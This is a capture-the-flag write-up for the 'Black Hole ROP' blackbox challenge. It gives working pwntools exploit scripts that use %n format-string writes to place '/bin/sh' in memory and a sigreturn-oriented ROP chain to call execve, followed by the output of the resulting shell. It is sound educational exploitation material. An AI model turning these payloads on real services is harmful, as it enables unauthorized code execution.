# Blackhole ROP

The description of this challenge was as follows:

*yes, its intended to be solved without the binary*

It was still worth 464 points at the end of the competition, which made it one of the harder challenges. As the description implies, no downloadables whatsoever were provided; you only got the netcat connection, making this what is commonly referred to as a blackbox pwn exercise. It was a fun little challenge, and the solution I ultimately implemented uses the techniques of using a format string to overwrite data and using the SIGROP technique to fill registers.

**TL;DR Solution:** Mess with the netcat connection to find that the input seems to simultaneously suffer from a format string vulnerability and some sort of probable stack overflow vulnerability. Use the leaked address of writable memory as a place to use the format string to write '/bin/sh' to, then use the "pop rax" and "syscall" gadgets to implement a SIGROP and call execve(), with the address we wrote '/bin/sh' to in rdi.

## Understanding the Program:

My first step on a binary exploitation challenge is to run the program to see what it does. Since I have no binary file, this is especially important since it's one of the only way to at least sort of reverse-engineer the program. When I connect to the netcat connection, I see that it is giving me three leaks for free, which are for a "pop rax ; ret" gadget, a "syscall ; ret" gadget, and the address of some writable memory in the binary. The specific sizes of those addresses imply that this is an x86-64 binary, and the PIE is not being used. I then tried some different inputs to see if anything interesting happened. Once it was clear that my inputs get printed back to the console, I tried a format string of "%p" to see what got printed back; the result was that an address got printed back, which indicated that the input has a format string vulnerability. Since the title of this challenge includes ROP, it then made sense to try to get an overflow. This seems to have worked; I just need to try to figure out the required payload size.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ nc 0.cloud.chals.io 12655

                                                      llllooooooolllllll
                                              llloodddddddddddddoooooooooll
                                       lllloooddddddddddddddddooooooooooool
                                  llooodddddddddxxxxxkkkkkkxxddoooooooolll
                             lloooddddddxxxxkOOOOOO000000OOkxxdddoooolllll
                        llloodddddxxxkkOOO0000000KKKKKK000Okxddddoooolll
                     lllooddxxxxkkOOOOO0000OOOOOOOOO00KK00Oxddddddoooll
                  llloodxxxxkkOOOOOOkkxdddoooolllllloxO000kxddoddddoll
               lloooodxkkkOOOOOOkdol         ''....'  x00Oxdddoooooll
             looooodxkOOOOOkxdol   '''.........     . kOkxddoooooll
          llooooddxkOO00Okdl   '.........            xOkxddooooool
        loooooddxkOOOOkxo  '..... ....            . xkxdoooooool
      looooddxxkkOOOOxl  .......                . oxxdooooolll
    loddddddxxxkOOOkd  ...                    ' oxxdooooooll
   lodddoddxxxkOO0Oxl '.                  .' ldxddoooooolll
  loodddoddxxkkOOOOxo  ..           ..'   odddddoooooooll
 lodddddoddxxkkkOOOOkdl  '......'   odxxdddddoooooolll
lloddddddooddxxxxkkkOkkkkxxxddddxxxxxxdddooooollll
llooddddddddddddxxxxxxxxxxxdddddddddddoooolllll
llloooooooooooddddxxxxxxxdddddddoooollll l
ooooooooddddddddxddddddddddooolll  lll
looooooooooooooooooooooollll
    llllllooooolllll
       lllll
----------------------------------------------------------------------------
 ~ Welcome to Black Hole ROP ~
----------------------------------------------------------------------------
<<< Address of syscall, ret    : 0x4013bb
<<< Address of writable memory : 0x666000
<<< Address of pop rax, ret    : 0x4013c5
----------------------------------------------------------------------------

>>> aaaaaaa

<<< You say: aaaaaaa
>>> %p

<<< You say: 0x7ffcff0b9870
>>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

<<< You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
```
Next, I tried to figure out the length of the pad. I ended up just doing a while loop with increasingly large sendlines and seeing what size produced a crash.
```
from pwn import *

target = remote('0.cloud.chals.io', 12655)

syscall = 0x4013bb
writeable_area = 0x666000
pop_rax = 0x4013c5


print(target.recvuntil(b'<<< Address of pop rax, ret    : 0x4013c5'))
i = 1
while True:
    
    target.sendline(b'a' * i)
    print(target.recvuntil(b'<<< You say:'))
    print(i)
    i += 1

target.interactive()
```
That size was 40. This seems like it's probably correct; padding in an x86-64 binary is typically divisible by 8, which this is. Once we have a payload that should do something visible, we can test the padding's size out!
```
...
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n>>> \n<<< You say:'
36
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n>>> \n<<< You say:'
37
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n>>> \n<<< You say:'
38
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n>>> \n<<< You say:'
39
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n>>> \n<<< You say:'
40
b' aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa----------------------------------------------------------------------------\n<<< Address of syscall, ret    : 0x4013bb\n<<< Address of writable memory : 0x666000\n<<< Address of pop rax, ret    : 0x4013c5\n----------------------------------------------------------------------------\n\n>>> \n<<< You say:'
41
Traceback (most recent call last):
  File "blackhole_rop_writeup.py", line 15, in <module>
    print(target.recvuntil(b'<<< You say:'))
  File "/home/knittingirl/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 333, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/home/knittingirl/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
  File "/home/knittingirl/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 183, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/home/knittingirl/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/home/knittingirl/.local/lib/python3.8/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to 0.cloud.chals.io port 12655
```
## Writing the Exploit:

### What is SIGROP?

Two of the leaked gadgets give us: #1: Control of the rax register, #2. The ability to do a syscall. Conveniently, this is also everything that we need to do a SIGROP attack. 

SIGROP works by setting rax to 0xf and triggering a syscall; in the x86-64 architecture, this triggers a sigreturn syscall, which will fill every register with content from the stack in a predictable fashion. This means that by setting up a ROPchain to trigger the sigreturn, and adding a large amount of data to the stack after the syscall to be loaded into the stack, you can essentially gain control over any and all registers. This includes the instruction pointer of rip, which can be filled with a function pointer, including a syscall, and which will be executed after the sigreturn when all of the other registers are filled.

The obvious end goal with a SIGROP is to call execve('/bin/sh', 0, 0). The appropach gives us all the needed control over the function parameters and the ability to call the execve syscall; the main hurdle in this case is that we do not have a location for '/bin/sh' in the binary, and we would need to pass an address that stores the string to rdi for the syscall to pop a shell.

### Format String to Write '/bin/sh'

There are two main aspects of this binary that are not strictly necessary for SIGROP, but that can fix the lack of '/bin/sh'. Firstly, we have the address of a writable section of memory, to which '/bin/sh' could be written. Secondly, we have a format string vulnerability; while format strings are often used to leak data from a binary, the %n format string can also be used to write to sections of memory with appropriate permission. Specifically, '%n' prints the number of characters already printed to the address specified. This means that I can convert each letter in the '/bin/sh' string to its corresponding number from ascii, use %+number+x to print number characters, and follow it by an appropriate %n format string that is lined up with the writable area's address. To this end, I created a custom helper function in pwntools to write the whole string to the writable area one byte at a time, then I read from the affected address using the %s format string to make sure that it worked. Here is the relevant bit of code:
```
def write_to_writable(string, writable_area):
    for i in range(len(string)):
        payload = b'%' + str(ord(string[i])).encode('ascii') + b'x%8$n' 
        payload += b'c' * (16 - len(payload))  + p64(writable_area + i)
        target.sendline(payload)
        print(target.recvuntil(b'You say'))

print(target.recvuntil(b'<<< Address of pop rax, ret    : 0x4013c5'))

write_to_writable('/bin/sh', writable_area)

#Just me checking that the write worked.
payload = b'%8$s' + b'\x00' * 12 + p64(writable_area)
target.sendline(payload)

target.interactive()
```
And here is a snippet of the results:
```
c\x03`f\n>>> \n<<< You say'
b':                                        31f083b0cccccccc\x04`f\n>>> \n<<< You say'
b':                                                                                                            31f083b0ccccccc\x05`f\n>>> \n<<< You say'
[*] Switching to interactive mode
:                                                                                                 31f083b0ccccccc\x06f
>>>
<<< You say: /bin/sh
>>> $
```
We can officially write '/bin/sh' to the binary, so the SIGROP should now be viable.

### Pulling it All Together

At this point, the exploit is pretty simple to write, with the help of pwntools. First, I need to get '/bin/sh' in the writable area, as described above. Second, I write a small ROP chain that places 0xf in rax using the pop gadget, then calls syscall. Finally, I set up the stack so that the registers work out after the sigreturn to call execve('/bin/sh', 0, 0). To do this, I need to set rdi to the address that now contains '/bin/sh', rsi and rdx to 0, rax to 0x3b to specify the execve syscall, and rip to the syscall gadget so that it is jumped to immediately after the sigreturn. This would be difficult to set manually, especially with no ability to debug the program; fortunately, pwntools offers the ability to set up a stack frame in which register contents can be specified, and then the whole thing can be placed after the sigreturn syscall. The full script is below:
```
from pwn import *

target = remote('0.cloud.chals.io', 12655)

syscall = 0x4013bb
writable_area = 0x666000
pop_rax = 0x4013c5

def write_to_writable(string, writable_area):
    for i in range(len(string)):
        payload = b'%' + str(ord(string[i])).encode('ascii') + b'x%8$n' 
        payload += b'c' * (16 - len(payload))  + p64(writable_area + i)
        target.sendline(payload)
        print(target.recvuntil(b'You say'))

print(target.recvuntil(b'<<< Address of pop rax, ret    : 0x4013c5'))

write_to_writable('/bin/sh', writable_area)

#Just me checking that the write worked.
payload = b'%8$s' + b'\x00' * 12 + p64(writable_area)
target.sendline(payload)

print(target.recvuntil(b'You say'))

padding = b'a' * 40
payload = padding 
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)

context.arch = "amd64"

frame = SigreturnFrame()

frame.rip = syscall
frame.rax = 0x3b
frame.rdi = writable_area
frame.rsi = 0
frame.rdx = 0
payload += bytes(frame)
target.sendline(payload)

target.interactive()
```
And here is how it looks when run against the netcat connection:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ python3 blackhole_rop_writeup.py
[+] Opening connection to 0.cloud.chals.io on port 12655: Done
b"                                                                           \n                                                      llllooooooolllllll   \n                                              llloodddddddddddddoooooooooll\n                                       lllloooddddddddddddddddooooooooooool\n                                  llooodddddddddxxxxxkkkkkkxxddoooooooolll \n                             lloooddddddxxxxkOOOOOO000000OOkxxdddoooolllll \n                        llloodddddxxxkkOOO0000000KKKKKK000Okxddddoooolll   \n                     lllooddxxxxkkOOOOO0000OOOOOOOOO00KK00Oxddddddoooll    \n                  llloodxxxxkkOOOOOOkkxdddoooolllllloxO000kxddoddddoll     \n               lloooodxkkkOOOOOOkdol         ''....'  x00Oxdddoooooll      \n             looooodxkOOOOOkxdol   '''.........     . kOkxddoooooll        \n          llooooddxkOO00Okdl   '.........            xOkxddooooool         \n        loooooddxkOOOOkxo  '..... ....            . xkxdoooooool           \n      looooddxxkkOOOOxl  .......                . oxxdooooolll             \n    loddddddxxxkOOOkd  ...                    ' oxxdooooooll               \n   lodddoddxxxkOO0Oxl '.                  .' ldxddoooooolll                \n  loodddoddxxkkOOOOxo  ..           ..'   odddddoooooooll                  \n lodddddoddxxkkkOOOOkdl  '......'   odxxdddddoooooolll                     \nlloddddddooddxxxxkkkOkkkkxxxddddxxxxxxdddooooollll                         \nllooddddddddddddxxxxxxxxxxxdddddddddddoooolllll                            \nllloooooooooooddddxxxxxxxdddddddoooollll l                                 \nooooooooddddddddxddddddddddooolll  lll                                     \nlooooooooooooooooooooooollll                                               \n    llllllooooolllll                                                       \n       lllll                                                               \n----------------------------------------------------------------------------\n ~ Welcome to Black Hole ROP ~ \n----------------------------------------------------------------------------\n<<< Address of syscall, ret    : 0x4013bb\n<<< Address of writable memory : 0x666000\n<<< Address of pop rax, ret    : 0x4013c5"
b'\n----------------------------------------------------------------------------\n\n>>> \n<<< You say'
b':                                         5fa9bf0cccccccc\n>>> \n<<< You say'
b':                                                                                            5fa9bf0cccccccc\x01`f\n>>> \n<<< You say'
b':                                                                                                   5fa9bf0ccccccc\x02`f\n>>> \n<<< You say'
b':                                                                                                        5fa9bf0ccccccc\x03`f\n>>> \n<<< You say'
b':                                         5fa9bf0cccccccc\x04`f\n>>> \n<<< You say'
b':                                                                                                             5fa9bf0ccccccc\x05`f\n>>> \n<<< You say'
b':                                                                                                  5fa9bf0ccccccc\x06`f\n>>> \n<<< You say'
[*] Switching to interactive mode
: /bin/sh
>>>
<<< You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc5ls
-
banner_fail
bin
blackhole
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
service.conf
srv
sys
tmp
usr
var
wrapper
$ cat flag.txt
shctf{1-hAs-4-ngul4riTy-coNtain3d-w1thin-a-r3g1on-oF-sp4c3}
```
Thanks for reading!
